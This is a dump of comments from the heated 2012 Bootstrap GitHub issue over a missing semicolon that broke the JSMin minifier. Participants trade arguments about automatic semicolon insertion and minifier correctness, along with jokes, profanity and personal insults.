6081	"@sroussey parse !== ""build a complete and accurate syntax tree""

JSMin walks through the JavaScript code maintaining state and taking actions based on that state.  It is removing a \n character where doing so causes a change in program behavior.

Stupid code or not, this is a broken minifier, because it's not adhering to the contract it claims to.
"
6082	"Thank for not using semicolons =)

Semicolons -1
"
6083	"@isaacs I love your choice of !== rather than !=

:)

I'd say (which is _not_ at odds with your assertion):

parse == ""build a complete and accurate syntax tree""

After all, ! has side effects and a more complex AST on the client. Play with http://esprima.org/demo/parse.html and see.

Anyhow, back to taxes...
"
6084	"See also this related issue https://github.com/madrobby/semicolon.js/pull/2
"
6085	"> I call bullshit on the whole situation. If semicolons aren't required, 
> then we don't need to include them. It's as simple as that.

When I joined Yahoo! I had the habit of not including semi-colons after the last declarations in declaration blocks. I know that's CSS, but it does relates to this thread... 

Not adding "";"" was against company best practices, but I thought there was **no reason** to add them since they are not required. It turned out that Safari 2 had a bug that made it drop a whole styles sheet after a missing semi-colon. 

At the time, I didn't spend energy trying to defend myself; I added the semi-colon and moved on. Imo, the point is not about finding out who's right or wrong, it's about doing the right thing. It's about the outcome.
"
6086	"""Don't be a JavaScript hipster. Add semi-colons."" I love this one!

Seriously, use the f@#king semicolons.
"
6087	"For fucks sake people - if using ugly semicolons and a few extra parenthesis will guarantee current AND future compatibility then what is the problem?  I don't find code written in this fashion difficult to read.
"
6088	"I heard semicolons killed @fat 's family and now he's using the left-over wealth from his father's fortune to fight against them. Seems legit.
"
6089	"Wow, so both @fat and @douglascrockford made changes to support interop. Bravo.
"
6090	"Take a look http://mislav.uniqpath.com/2010/05/semicolons/ by @mislav 
I'm personally prefer semicolons
"
6091	"Everyone wins! Both libraries get a little better. Thanks @fat and @douglascrockford for working to make the internet more awesome.
"
6092	"@leeoniya hm that's weird. I'm using uglifyjs in Rails asset pipeline and never had issues.
"
6093	"Semicolons cause an equal amount of debate in English grammar circles and although it's yet to be proven I believe they partially caused the first World War.

Clearly the solution to all the world's problems is to remove semicolons from the global character set.
"
6094	"@stereobooster .. you have made me feel clean!  I use ;'s as separaters and {}'s only for multi-line blocks, not single line blocks.  I've come out of the closet!
"
6095	"@maxogden wow, that's a great shed haha
"
6096	"Why on earth is this discussion even happening?

JSMin is a specific program that performs a task. It has a contract with the user. It gets an input (your js) and produces an output (minified js), following some rules. Nobody (AFAIK) said this is going to work perfectly with any possible valid JS code.

@isaacs said:
_(..) Stupid code or not, this is a broken minifier, because it's not adhering to the contract it claims to._

Let's see... Is it really broken? What contract does it claim to adhere to?
Please read: http://www.crockford.com/javascript/jsmin.html (And/or any other documentation I might not be aware of).

Pay attention to the ""Caution"" section. It's not explicit, but give you the heads up: not any random code will work... you have to watch out for some special situations. Valid JS code might fail when being processed through JSMin.

This situation is kinda the same. It doesn't matter whether ommiting that semicolon is a stupid decision. That's irrelevant in this discussion, imo.

_What I think DOES matter, is:_
Perhaps JSMin should have better documentation about specific valid JS code that might break while minifying (maybe that piece of documentation exists, and I don't know it).
"
6097	"Github threads are becoming so epic we need like buttons now.

+1 on the bike shed @maxogden
"
6098	"@tony4d first of all we need ""unsubscribe"" option :D
"
6099	"@pokonski There's a [""disable notifications for this issue""](https://github.com/twitter/bootstrap/issues/3057/unsubscribe) link at the bottom.
"
6100	"@kitcambridge but they still appear in the top right corner forever. Or maybe Github fixed that, will see once someone posts a reply ;) 
"
6101	"wtb namespace keyword and a bunch of inane reasons why this is somehow torvalds' fault
"
6102	"@SlexAxton: ""I heard semicolons killed @fat 's family"". 

My deepest condolences. I can totally understand his fight against semicolons than!

-1 semicolons
"
6103	"@fat could take the high ground, add the semicolon until JSMin is fixed and have his pissing contest off in the corner while the rest of us get shit done. But being practical doesn't pump your ego quite like religious posturing does. Trolls gon' troll.
"
6104	"@aaronhall https://github.com/twitter/bootstrap/issues/3057#issuecomment-5140916
"
6105	"@fat thanks, missed this in the sea of comments.
"
6106	"@fat props to you on the maturity in the face of stuff like ""insanely stupid code"" and the flames that seems to have cued. Thank you for work.
"
6107	"From [JavaScript::Minifier](https://metacpan.org/module/JavaScript::Minifier),

> The primary requirement developing this module is to not break working code
"
6108	"@fat +1
Semicolons -1

If the damn language allows it, so be it.  Best practices == Cleanest Code.
"
6109	"@backspaces sorry... Best practices === Cleanest Code </trolling>
"
6110	"LOUD NOISES!
"
6111	"After reading this I feel like I don't want to use semicolons. If you can't read code without semicolons, you shouldn't be coding in the first place... If minifier breaks the code because it doesn't agree with not using semicolons, f*ck that minifier, it's obviously broken, get a minifier that actually does what it's supposed to do.
"
6112	"Do we need this amount of traffic over this issue?
We can debate the syntax conventions all day, but no code munger should break functional code.  Period.                       
"
6113	"""Functional"" code, valid syntax:

``` C
  #define true false
  #define false true

  #define true 0
  #define false !true

  #define if while
  #define continue break
```

``` javscript
undefined = true;
```

So you think we should write code like these just because it has a valid syntax?
"
6114	"No, I don't think anybody should be writing code with sloppy, ignorant, or obfuscated syntax.  Hell, I reformat open-source code so braces line up and if statements are properly enclosed in braces and so forth.

But the fact remains: If the language compiler accepts it, then it should still compile after any preprocessing.  It may suck stylistically, but take that up with the language author.
"
6115	"Guys, more background from 'Fat' on why he doesn't use semicolons written back in October 31st 2011:
http://wordsbyf.at/2011/10/31/i-dont-write-javascript/

Quotes:
On the use of '&&' instead of an 'if' statement: ""If you were really having fun with it you could lose the if all together... Each is perfectly valid. Each behaves the same. It’s just a matter of preference and finding the style that makes most sense to you.""
JSLint is described as a ""unnecessarily strict linter"".
""The majority of lines however don’t end with semicolons because they simply aren’t necessary and I prefer the minimalist aesthetic. For me, \n character is enough and the semicolon character is redundant.""

... IMHO: Don't be a JavaScript hipster. Add semi-colons.
"
6116	"LOL -- This has made me giggle :)

Use Dart if you dont like JS :P Google wont complain.......
"
6117	"Javascript is neither pyhton nor ruby.. Learn to use semicolons, actually learn language you use properly. I can't understand why everybody is talking about semicolon everywhere. Before starting to code, learn language..
"
6118	"Mikeal wrote a very good post about - why no semicolons - and I agree 100%

http://www.mikealrogers.com/posts/two-things-about-semicolons.html
"
6119	"Wow, wasn't much more simple to just click the Merge button and add the fucking semicolon? So much wasted time....
"
6120	"@iwiznia Some people take the way of the least resistance ( click Merge button ) and some stand for there beliefs @fat. 

I like people that stand for there beliefs.

(And fyi: @fat changed the code 2 days ago to a way that that doesn't fail in jsmin - the discussion is more general about ;+ oder ;- )
"
6121	"@nivoc - Thanks, but while that Mikeal post starts out promisingly enough, it sort of trails off without really going anywhere.

It's really off-topic, but I do think it's perfectly reasonable not to use semicolons in JS where the implied statement termination is obvious; unfortunately, the ASI rules make it ""obvious"" in cases where there actually isn't one inserted.  IM(ESH)O, the character _after_ the newline shouldn't play any part in whether or not the newline is treated as a statement separator.   But since it does, you get surprises like this one. So I'd rather see more ""extra"" semicolons in the interest of readability, just as I like to see ""extra"" parentheses in many cases where the precedence rules don't require them.

Regardless, I'm glad that both @fat and @douglascrockford have modified their respective codebases in the direction of greater interoperability.
"
6122	"Sega, Sega Sega, Sega http://youtu.be/M3baNJKYdpk
"
6123	"Someone please correct me if I am wrong. Isn't writing codes that depends on the quirks of the language (because it is designed to be _forgiving_ in some situation) is also akin to write codes that depends on the quirks of a browser (because well, it is also designed to be _forgiving_ in a lot of cases)?

Since the _forgiving_ part may change in the future, because its well.... not the intention of the language (its just tries to accomodate omission on the coders part), it seems that to me we can also say the same thing for browsers. Different versions of browsers tend to have different quirks of dealing on being _forgiving_.

What do anyone think of the parallels here? Is it a correct one to draw or is it nowhere near being right?
"
6124	"Just a short question: Why JSMin? Why not UglifyJS?
"
6125	"Is writing JavaScript without semi-colons Web 3.0?
"
6126	"You can learn java in one day, but you are not productive until you learn the library, and the java-isms. Perhaps Javascript is similar, with the exception that the Javascript-ism have changed over time, and there are different Javascript-isms depending on what Javascript culture. Theres more than one Javascript culture (maybe as much different ways to describe a object in Javascript).

 The minifier is from a C like culture, where "";"" is usefull to describe intend. And the Bootstraping.js library is from a Ruby culture where "";"" on the start helps avoid bugs.

Perhaps I was wrong, and the author of bootstraping don't need to change his code. While the author of jsmin is free to either support this Ruby-ismised-Javascript or ignore it. Being all cool.  
"
6127	"Anybody else find all those ""you need to learn the language - use semicolons"" comments ironic?

The fact is that ecmascript doesn't require semicolons. If you don't approve it, I'm afraid nobody really cares.
"
6128	"The level of Asperger-fueled pedantry on display here makes me feel sick. Just shut up please, JavaScrHiptsters.
"
6129	"[This is why automatic semicolon insertion sucks](http://www.youtube.com/watch?feature=player_detailpage&v=hQVTIJBZook#t=1847s)

Yes.. it's a speech by Douglas Crockford, but he's right.
"
6130	"> [This is why automatic semicolon insertion sucks](http://www.youtube.com/watch?feature=player_detailpage&v=hQVTIJBZook#t=1847s)

JavaScrHiptsters should take note at [0:34:30](http://www.youtube.com/watch?feature=player_detailpage&v=hQVTIJBZook#t=2070s) and seriously ask themselves the same question.
"
6131	"@Trevr 

So writing non-working code relates to semicolons how? If you follow Crockford's guidelines to the dot, soon you can't take a dump without semicolons to tell you when to stop pushing - the man is fanatic about his semicolons. Like I said before, if you can't write valid javascript without semicolons you are doing it wrong.
"
6132	"I'm impartial about how this ends up, but for the love of god @Trevr, please stop trying to get ""JavaScrHiptsters"" to catch on.
"
6133	"@zero- Actually I was just trolling. The Crockford video was quoted from the guy above. But could you be any more smug? Does it make you feel smart to tell people they're ""doing it wrong""? Your epenis must be enormous.

@envex Yeah you're right. **javaScrHiptsters** use lower camel case.
"
6134	"Refusing to use optional syntax is a perfectly valid position to hold.

Insisting upon always using the optional syntax is also perfectly valid.

Unfortunately, picking one or the other (arbitrarily, I might add) and arguing incessantly on the internet about it is neither valid nor pragmatic.

<img src=""http://i.imgur.com/cPvtB.gif"" />

Please, stop shitting all over my activity feed.
"
6135	"but is it 

```
flogDeadHorse()
```

or

```
flogDeadHorse();
```

[?!?](http://www.youtube.com/watch?feature=player_detailpage&v=hQVTIJBZook#t=2070s)
"
6136	"More like:

``` javascript
while(horse.isDead())
  console.flog(horse)
```
"
6137	"Resolved! All languages should be s-expressions.

) > ;

;-)
"
6138	"@douglascrockford jsmin.c is insanely stupid code.  Seriously... action(1), action(2), action(3)?  Really?

Sorry, but nobody should dumb down their code to play at Doug's level.

https://github.com/douglascrockford/JSMin/blob/master/jsmin.c#L122

This guy deserves serious code shaming.  Why do people even listen to him and his rants?
"
6139	";
"
6140	"@sferik except console methods are expected to not have side effects. flogging will leave visible lacerations on skin, even tough horse skin
"
6141	"@jldailey you can't be serious.
"
6142	"@kernel-io did you read his code? yes, i'm serious.

Taking three (completely different) functions, mashing them into one
function, where you pass an integer to control which function actually
runs?!?  That is CS 101 noob shit.
"
6143	"@jldailey I'm guessing that you missed that cases in action() don't have breaks?
"
6144	"@boxofrad your work here is done
"
6145	"@fadzlan nope. quirks-things where never any standard. it's old non-standard-wild-grown-browser-specific stuff.

Automatic Semicolon Insertion in contrast is not wild-grown at all. It's part of the official standard by intention and supported by every javascript-runtime in the same way. In the way that is specified in the spec. 

And as mikeal points out:
""There is no error in your JavaScript that is being “corrected,” the AST generated from semicolon-less JavaScript is identical to its semicolon riddled counterpart. ""
""ASI is a basic part of the language, it’s not an amendment.""

http://www.mikealrogers.com/posts/two-things-about-semicolons.html
"
6146	"This is still going on?  We have to set up spam filters to dump this crap to the trash?
KNOCK IT OFF.                     
"
6147	"@Stokestack there's a notification toggle at the bottom of the page.
"
6148	"@JakeWharton you got it!!!
"
6149	"> there's a notification toggle at the bottom of the page.

Thanks, but I don't see it on GitHub nor in the E-mails that are pummeling us.                    
"
6150	"Look for this:

![](http://i.imgur.com/UtvFu.png)

With your eyes.
"
6151	"Tried that.  The eyes thing, I mean.  Then I licked the screen and didn't taste it.  Also tried Braille.  Nope.  Even checked the top of the page, to see if there was some confusion there.  Nope again.
Junk filter implemented.  Thanks anyway.                      
"
6152	"P.S. `javaScrHiptsters` is now a thing.
"
6153	"@lotyrin I did miss that. It does make it slightly better; so it's not completely stupid.  It is still insanely terrible code, just not stupid.
"
6154	"http://semicolonfree.tumblr.com/

A collection of resources to write semicolon-free JavaScripts.
"
6155	"This'll probably get lost in the noise, but the problem isn't confined to Jsmin. My webminifer plugin (which can use Closure or YUI for minification), also suffered the problem. The resolution was to ensure that a semicolon always appears between each file that is appended to each other (I append all files of my project and then minify).

My recommendation to the Bootstrap boys is to think about linting the code and avoid ambiguities. I love bootstrap, but the JS is not so intuitive.
"
6156	"@jldailey Berating someone much smarter than you might make you feel better but you're not impressing anyone nor are you changing the reality that you are a clueless, talentless hipster.
"
6157	"@Trevr I echoed back his exact words to him. As I suggest you echo
your own to yourself as you berate someone you dont know.

On Tue, Apr 17, 2012 at 2:07 AM, Trevr
reply@reply.github.com
wrote:

> @jldailey Berating someone much smarter than you might make you feel better but you're not impressing anyone and it doesn't change the reality that you are a clueless, talentless hipster.
> 
> ---
> 
> Reply to this email directly or view it on GitHub:
> https://github.com/twitter/bootstrap/issues/3057#issuecomment-5168901
"
6158	"@Trevr Crockford hasn't had an intelligent thing to say about
JavaScript for years, but he wrote an OK book once and he writes a
couple bad tools now, and he sits on a committee famous for
barely-mediocre output, so we should consider him an ""authority"".

No, we should ignore his mediocre tools, and his belligerent reviews of a typo.
"
6159	"@jldailey You were just trying to score geek cred by talking down someone who is clearly much smarter than you. He was accurate and to-the-point.

It's kind of sad to see so many clueless hipsters like yourself masquerading as serious software developers and desperately trying to be taken seriously. Instead of acknowledging and improving upon what people like Crockford have built, you seem to prefer bikeshedding and picking apart trivial crap like this to make yourself feel relevant.
"
6160	"@Trevr lol, did you really create a github account for the sole
purpose of trolling this thread?  Well played.
"
6161	"@kitcambridge You really need to sort that face out.
"
6162	"The question is, what do we lose if we ended this infinite argument and added a single character that would make thousands of developers happy? Bandwidth or pride?
"
6163	"Haven't you **javaScrHiptsters** got anything better to do? How about writing some _revolutionary_, _world-changing_ software?
"
6164	";
"
6165	"Or just use coffeescript instead of trying to make a fundamentally shit language look like the cool kid languages?

Writing code like this is like a fat, red-headed kid putting gel in his hair to impress the ladies.
"
6166	"> Writing code like this is like a fat, red-headed kid putting gel in his hair to impress the ladies.

That is _so_ racist.
"
6167	"If Javascript didn't require semicolons, then it wouldn't be called ""Automatic Semicolon Insertion"". Just because you don't need to put it in your code prior to that code being interpreted doesn't mean that semicolons aren't added for you before the script is actually run.
"
6168	"@Apreche ""Are we adults or children?""

Are we painters or plumbers?  If all one cares about is how many holes the shit will go down, that's just a plumber.

@egeozcan The original code was a bug, and was changed, that isn't the issue.  The issue is whether a painter, working on his own art, on his own time, for his own enjoyment, has _any_ reason to sacrifice _anything_ (his aesthetic or ego or  anything else) to please a bunch of plumbers.
"
6169	"Can someone please create an unofficial branch of this library. 
The authors have done an excellent job of creating it but this is not the first time they have been overly opinionated about trivial stuff. 
"
6170	"@jldailey I wouldn't give credit to such a weird (sick, even) analogy but I need to say that if a painter is causing problems that would require bunch of plumbers to solve, that painter is doing something terribly wrong.
"
6171	"I'm glad this was changed in 2.0.3. When I used Bootstrap in Django, the dropdown.js broke in compressor as well. I saw what was going on, understood why they did it but added semi-colons anyway because it was a bad decision to hoist a personal vendetta against Javascript onto those who use Bootstrap.

I added the semi-colons myself. Not a great practice, forking the code like that. But whatever. I'm not afraid of semi-colons.

Should be known, though, that this broke the Django compressor plugin as well.
"
6172	"@egeozcan ""problems"", ""require"", and ""solve"" are value-judgement words
that only the plumbers share.  The painter is not causing a problem
for himself or other painters.
"
6173	"Wow, its amazing how somebody can put so much effort and work into something that makes the lives of developers easier..

Then the community hate him because he misses a semi colon.

I agree the semicolon _should_ be there, but wont somebody please think of the children!

![](http://1.bp.blogspot.com/-8PhsFAmbEUw/TtyvGDBGrcI/AAAAAAAAAEc/c_LihPteDT4/s1600/think-of-the-children.jpg)
"
6174	"@jldailey this is one of the many points where your analogy fails as only a few painters would work with tools that have terrible glitches. Also, you cannot assume that a problem doesn't exist, when it's just not valid for yourself. Does ""works on my machine badge"" ring a bell? These problems should worry you especially when you consider that this is the project with the most followers on GitHub, taking huge contributions. Ignoring community would make sense in few cases ( http://www.codinghorror.com/blog/2012/02/listen-to-your-community-but-dont-let-them-tell-you-what-to-do.html ), especially when there is a clear conflict of interest for the main maintainers but I don't see that here. Fixing problems like this would also bring no maintainability burden, if they don't already reduce it.
"
6175	"@egeozcan
""only a few painters would work with tools that have terrible
glitches"", again a value-judgement about painters that only plumbers
share, because they value utility over everything else, so of course
""glitches"" are a deal-breaker.  Painters will literally paint with
excrement if they feel like it... and every now and then they turn
excrement like JavaScript into something amazing (remember the
original Prototype.js? a work of art in its day... or underscore.js
now)
"
6176	"@jldailey so makers of Prototype.js, underscore.js and bootstrap value code beauty over utility? Well, you seem to know these people very well; I can't comment on that. However, you calling a programming language (which also happens to be the number one on GitHub, even though it doesn't need to be) ""excrement"" tells a lot about your ""painting skills"" =)
"
6177	"ಠ_ಠ
"
6178	"@egeozcan I never assigned motive to prototype or underscore, just my
own judgement of their quality; they built something that pleases me
from a language that doesn't. And, I think the bootstrap source speaks
for itself here.

Ad hominem much? Try making an argument next time.
"
6179	"I don't think the author has much options. I mean, look at the code.  The lack of "";"" is everywhere. 
The author could add a "";"" there, but down the line the code will break again, perhaps in other file, perhaps with a different minimizer making similar asumptions. 

http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js

``` Javascript
  Dropdown.prototype = {

    constructor: Dropdown

  , toggle: function ( e ) {
      var $this = $(this)
        , selector = $this.attr('data-target')
        , $parent
        , isActive

      if (!selector) {
        selector = $this.attr('href')
        selector = selector && selector.replace(/.*(?=#[^\s]*$)/, '') //strip for ie7
      }

      $parent = $(selector)
      $parent.length || ($parent = $this.parent())

      isActive = $parent.hasClass('open')

      clearMenus()
      !isActive && $parent.toggleClass('open')

      return false
    }

  }
```
"
6180	"@jldailey my whole point was you didn't have any arguments except some snobby attitude towards a programming language. Against someone just going further and declaring a language unpleasant and calling who embrace it ""plumbers"", what am I supposed to argue? Start categorizing you or calling names? Whatever. I just had to state my opinion on a project that I hold some interest and this is going out of control. Have fun with painting, plumbing or whatever your thing is.
"
6181	"Can someone at @twitter please block @trevr?  This user is a child getting off on trying to incite ill will.
"
6182	"@egeozcan you missed the point of the plumber analogy, it wasn't to
judge plumbers (who are very smart and productive people, they just
have different values). Let the painters paint, let the plumbers
plumb.

Interoperating with jsmin.c is worth $0 and no cents to a painter.
But, it's value must be ""obvious"" to a plumber.

But, it's wrong to call a painter insane or stupid because he doesn't
care about the same things you do (that was the point of the echo, in
case you missed that rhetorical point)...  thats the argument: people
who call others ""insane"" and ""stupid"" for having a different POV are
just being belligerent and should be ignored, authority is irrelevant,
and productivity a red herring.

The most common corollary of authority is belligerence, not access to
""truth"" (or, ""the right way"").
"
6183	"To those who believe nothing positive came from this debate, I offer [this](http://pksunkara.github.com/semicolon/).
"
6184	"Oh for fuck sake stop rabbiting on!!!

Sent from my Windows Phone

---

From: Jesse Dailey
Sent: 2012-04-17 20:17
To: Gareth Bradley
Subject: Re: [bootstrap] bootstrap-dropdown.js clearMenus() needs ; at the end (#3057)

@egeozcan you missed the point of the plumber analogy, it wasn't to
judge plumbers (who are very smart and productive people, they just
have different values). Let the painters paint, let the plumbers
plumb.

Interoperating with jsmin.c is worth $0 and no cents to a painter.
But, it's value must be ""obvious"" to a plumber.

But, it's wrong to call a painter insane or stupid because he doesn't
care about the same things you do (that was the point of the echo, in
case you missed that rhetorical point)...  thats the argument: people
who call others ""insane"" and ""stupid"" for having a different POV are
just being belligerent and should be ignored, authority is irrelevant,
and productivity a red herring.

The most common corollary of authority is belligerence, not access to
""truth"" (or, ""the right way"").

---

Reply to this email directly or view it on GitHub:
https://github.com/twitter/bootstrap/issues/3057#issuecomment-5183406
"
6185	"For maximum safety, use the `semicolons` module in npm.  When you `require('semicolons')`, they are required.

https://github.com/isaacs/semicolons
"
6186	"@jldailey you better don't judge them, I just didn't like that you tried to categorize people. You just can't, the people in the JavaScript community are just too diverse. You called a tool, which a lot of people love to work with, an ""excrement"". How do you decide that ""interoperating with jsmin.c is worth $0 and no cents to a painter""? I never defended anyone calling others names. Maybe they know each other and they are close enough to be able to say those things; who knows. However most of the people here are just trying to break a resistance which they see (or think) is unnecessary. They are not just ""painters"", ""plumbers"" or ""hipsters"". They are just making valid arguments to make a change in a project in which they have some interest or even contribution, perhaps. If you think that code beauty is more important in this project which has the slogan ""designed for everyone, everywhere"" and mainly used as a quick boilerplate for websites, I can only agree to disagree. It is not a war on semicolons. It's about making this project work ""everywhere"" as the slogan states.
"
6187	"For those responding to @jldailey, especially with the ""Crockford is smarter than you"" type stuff, please scroll all the way back and see where this tone (""insanely stupid code"") was set.

Additionally, I don't see the problem with the painter vs plumber analogy. Plumber is clearly not being used in a derogatory sense, unless you think @jldailey means Van Gogh when he says ""painter"".

FWIW, I may be a minority of one here for I think the semicolon is a good idea _because_ of aesthetic reasons!
"
6188	"> Nobody has any right of demanding someone who does something for his free time to change anything (assuming Twitter doesn't sponsor this, which I don't think they do?).

@dubcanada you might want to check out under which organization account this repo is hosted. If you provide a software for people to use, then you should listen to them and adopt their needs. On the other hand, you are right about the forking part. Just fork the repo and use it as you see fit. But this is not gonna change the fact that omitting semicolons is a bad practice.

On the other hand, you might wanna watch this part of this video http://www.youtube.com/watch?feature=player_detailpage&v=hQVTIJBZook#t=1847s 
"
6189	"@egeozcan Of course no individual is ever a perfect instance of a class.  That doesnt mean you can't talk about classes of people and the things that make them more similar to each other than they are to others.  It is naive to think otherwise, and it's a strawman to assert that I believe it (and possibly you were offended by a thought you only assumed I had).
"
6190	"The _un-official_ fork of Bootstrap for all your semicolon needs: https://github.com/semicolons4eva/bootstrap

Submit pull requests at your convenience!
"
6191	"I came here to say this;
"
6192	"Why would anyone want to take away Zoidberg's eyes?

`(V) (;,,;) (V)`
"
6193	"+1 to @douglascrockford for ""That is insanely stupid code.""
"
6194	"+1 to @ryantenney for +1ing @douglascrockford's beautiful words.
"
6195	"Some PHP...

``` php
function g($tag,$code){  return ""<$tag>"".$code. ""</$tag>""; } 

echo g(table,g(tr,g(td,""hello world"").g(td,""!"")));
```

this output:

``` html
<table><tr><td>Hello world</td><td>!</td></tr></table>
```

Actually, nobody on the PHP community write code like that.  Because all PHP programmers know better... 
"
6196	"This comment thread is long and pointless enough to be worthy of Reddit. `</FLAMEBAIT>`

On the other hand, if it keeps going, this dramatic story of semi-colons could be novelized and eventually turned into box office gold. Hmm... no time to start like the present...

---

_Jacob Thornton leaned back in his chair, folding his hands behind his head. He was left with another free afternoon in the offices of Twitter from all the time saved in not inserting unnecessary semi-colons. Yes, life was beautiful._

_Suddenly, Douglas Crockford stormed into his office, red-faced and sweating. ""You asshole!"" shouted Doug. Jacob sat up quickly and jolted the desk, nearly toppling his mocha frappuccino. Doug continued his tirade: ""What's this lack of semi-colon shit that broke JSMin? It's insanely stupid code. Learn to write JavaScript properly or **I will fucking end you**."" ..._

**_(to be continued)_**
"
6197	"@matthewdl We need illustrators for that memorable story.
"
6198	"Over 200 comments over a missing semicolon?? For fuck's sake people, don't you have any work to do?!
"
6199	"@englishextra That's a good idea. Got ideas for some? In the meantime, I've moved the story here: http://figment.com/books/308826-Dangerous-Punctuation

**Edit: I have since extended this scene and I expect David Fincher to call any second with a movie deal.**
"
6200	"Who could have guessed that missing semicolons would lead to the creation of Thornton/Crockford slash fiction?
"
6201	"@alekop apparently you don't have one either.
"
6202	"+1 on @englishextra suggestion -- definitely the comic route is the way to go. Who knows, perhaps there shall be a SuperColon... no wait...

@alekop congratulations on the 201st comment. And it's not even 5:01 yet. :-)
"
6203	"@alekop .. just consider /. maybe we can be as OT and pointless!
"
6204	"While I myself don't care so much either way about semicolons (whatever performs fastest is best IMHO), I imagine someone can write a tool to + or - ; to their preference.  I also find it ironic that the pro-; is on GitHub:

  Do your best to never use a semicolon. This means avoiding them at line breaks and avoiding multi-statement lines.

https://github.com/styleguide/javascript
But, ""Style Guides"" are just that; guides.
"
6205	"Be careful with Semicolon-free!
"
6206	"@tomByrer that's a horrible reference and one should never look at that page. As @haliphax indicated, _If Javascript didn't require semicolons, then it wouldn't be called ""Automatic Semicolon Insertion""_. This sentence should end the discussion but apparently didn't .
"
6207	"+1 @isaacs https://github.com/isaacs/semicolons/blob/master/semicolons.js  ha ha :) 
"
6208	"I need to teach some programmers JavaScript and make sure they are ready in 3 weeks. Should I explain them all the rules of ASI? Aren't we supposed to make our fellow developers' lives easier? Who do we code for really?
"
6209	"Ok, just because it's Friday and this thread is so entertaining:
![Alt text](http://icanhascheezburger.files.wordpress.com/2012/04/funny-pictures-animal-gifs-how-hairballs-happen.gif)
"
6210	"Someone with power (@douglascrockford ?) needs to set things in motion to make semicolons required in the spec. QED
"
6211	"@sbussard Do you know what QED means?

Making semicolons required in the spec would be a web-breaking change.  TC-39 will never do that.
"
6212	"@sbussard right, then all of the people's code will break. Changing something drastically would be the same as stabbing someone as @douglascrockford said. That's why they cannot do that.
"
6213	"@isaacs this argument is the best reason to add semicolons to the spec. QED — as was demonstrated by this argument. A couple regex replacements could fix pretty much all of that. Wasting time on dumb little disagreements is the real web-breaking problem. ■
"
6214	"@sbussard HAHAHAHa, dumb disagreements are web-breaking, that's what the web is FOR.
"
6215	"yet we consider ourselves engineers... :/
"
6216	"""You cannot make progress without making decisions."" -- Jim Rohn
"
6217	"If the reason for not including a semicolon was aesthetics, then one wouldn't do something like this:

``` javascript
Dropdown.prototype = {

    constructor: Dropdown

  , toggle: function (e) {
      var $this = $(this)
        , $parent
        , selector
        , isActive
```

Those dangling commas, in the middle of nowhere, really do look bad.
"
6218	"If you're still reading this.. you really should go out and PLAY!
"
6219	"damn these notifications I've been getting lol! #PLAY
"
6220	"Mr. Madison, what you've just said is one of the most insanely idiotic things I have ever heard. At no point in your rambling, incoherent response were you even close to anything that could be considered a rational thought. Everyone in this room is now dumber for having listened to it. I award you no points, and may God have mercy on your soul.
"
6221	"Seeing how @fat responded to this reminds me of how dumb it would be to use a library maintained by someone who doesn't value quality and reason, but makes decisions merely 'because they feel like it'. Pretty things built on a poor foundation aren't worth much to me. This is a great way to prune your user base.
"
6222	"The drama of this Github thread has now been forever immortalized.

http://figment.com/books/308826-Dangerous-Punctuation
"
6223	"@matthewdl 

> The drama of this Github thread has now been forever immortalized.

Read the story with pleasure
"
6224	"This thread can be summarized in two images:

Crockford: 
![Arg](http://i.imgur.com/sdxbS.jpg)

Fat: 
![Deal wit it](http://i.imgur.com/TDOUA.gif)
"
6225	"Ugly code that works > nice looking code that doesn't work.

Stop being a dick and put a god damn semicolon already, it's the best practice anyway. 
"
6226	"oh zing, this is now on reddit
http://www.reddit.com/r/entertainment/comments/t5ltx/twitter_programmers_fighting_over_using/
"
6227	"Yep, congrats, you guys are now famous. Twitter devs fighting over a semicolon in a code that apparently isn't broken is pretty hilarious. You should probably finish off this disussion before (and if) Twitter's shares goes public on the stock market.
"
6228	"only geeks can fight over something like this.
"
6229	"FTFY Only greeks can fight over something like this.

""You will go you will return not in the battle you will perish""
http://www.ancient-greece.org/history/delphi.html
"
6230	"Someone should just create a library that can semi-colon-ify the semi-colon free code, then we could use lint, and minifiers without extra work. And, no standards need broken, and this code can be considered valid. Much the same as having a opinion on whether brackets go on the same, or next line, or the method of indentation (# spaces, or tabs, etc...)

I personally use semicolons, 2 or 4 spaces for indenting, and keep my brackets on the same line. I don't see any reason to crucify fat for his style of code, and I also don't see why douglascrockford needs to have JSMin parse this kind of code. At this moment, JSMin not parsing the code is not a bug, but a choice.
"
6231	"They did.  Its called CoffeeScript
"
6232	"What we need is more fat / crockford fan fiction.
"
6233	"Can you please just add semicolons? By omitting them you are causing me and my team a big headache. Thanks!
"
6234	"@ scryptonite
""whether brackets go on the same, or next line""
Ask crockford about that one also!
"
6235	"I missed parts of this. What did we all agree on in the end?
"
6236	"In the end the guy who considers himself a hypster engineer wrapped the stuff into if statemanet:

clearMenus()

```
  if (!isActive) $parent.toggleClass('open')
```

Furthermore he twitted that ""The only reason I [fat] don't use semicolons is to troll people.""

There we are. http://www.youtube.com/watch?v=hQVTIJBZook --  Let the artists troll people and profs go on with the real progress
"
6237	"I guess this is lost amongst the noise, but I think it's best to listen to [Brendan Eich discussing this thread](http://brendaneich.com/2012/04/the-infernal-semicolon/) and Automatic Semicolon Insertion (ASI):

> ASI is (formally speaking) a syntactic error correction procedure

The point is that semi colons are actually required, it's just that your error in excluding them can be automatically corrected (in most cases).  So it seems clear to me that it's better to write correct code, in the format as it will be when actually run, rather than rely on automatic error correction.
"
6238	"It's important to remember that this struggle may lead to the end of all life as we know it.

CHOOSE NOW WHERE YOU STAND.

http://figment.com/books/308826-Dangerous-Punctuation
"
6239	"@pete-otaqui SO TRUE!

I don't understand why anyone would WANT to depend on ""error correction"" to ""fix"" their code for them.
"
6240	"Ok, how do I unsubscribe from this?
"
6241	"Just reply with ""unsubscribe"" in all caps
"
6242	"@tunnuz Look at the bottom of this page, below the ""Comment on this issue"" button
"
6243	"I'm appreciating this debate as I read _Maintainable Javascript_ by Nicholas C. Zakas. Style guides FTW.

http://google-styleguide.googlecode.com/svn/trunk/javascriptguide.xml
http://docs.jquery.com/JQuery_Core_Style_Guidelines
http://dojotoolkit.org/community/styleGuide
"
6244	"![](http://img.skitch.com/20120730-fxwf5ej5p53y62qbpk3msmgktk.png)
"
6245	"@NARKOZ epic win on an already hilarious thread :D
"
6246	"I think this is all about @fat trying to be hipster. You know... step over all style guides currently available at the moment. YAY!

Personally, I like, and I think the only correct answer is the first @douglascrockford comment. There's nothing else to add.
"
6247	"For the record, this was worth a talk: http://vimeo.com/53218578
"
6248	"Just want to be part of web history. Haha... Hilarious.
"
